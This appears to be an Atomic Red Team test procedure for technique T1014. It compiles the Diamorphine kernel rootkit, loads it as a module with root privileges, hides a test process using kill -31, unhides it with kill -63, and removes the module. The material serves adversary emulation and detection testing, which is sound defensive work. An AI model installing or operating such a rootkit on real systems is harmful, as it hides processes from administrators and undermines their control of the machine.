Elevation Required;
#pre
cd /home/ubuntu/atomic-red-team-master/atomics/T1014/src/Diamorphine
make clean
make
#command
cp /home/ubuntu/atomic-red-team-master/atomics/T1014/src/Diamorphine/diamorphine.ko /lib/modules/$(uname -r)/
depmod -a
modprobe diamorphine
#check
ping -c 100 localhost >/dev/null & TARGETPID="$!"
ps $TARGETPID
kill -31 $TARGETPID
if ps $TARGETPID; then echo "No such file or directory"; else echo "process hidden"; fi
kill -63 1
modprobe -r diamorphine
if ps $TARGETPID; then echo "confirm success"; else echo "No such file or directory"; fi
kill $TARGETPID
#cleanup
rm -rf /lib/modules/$(uname -r)/diamorphine.ko
depmod -a
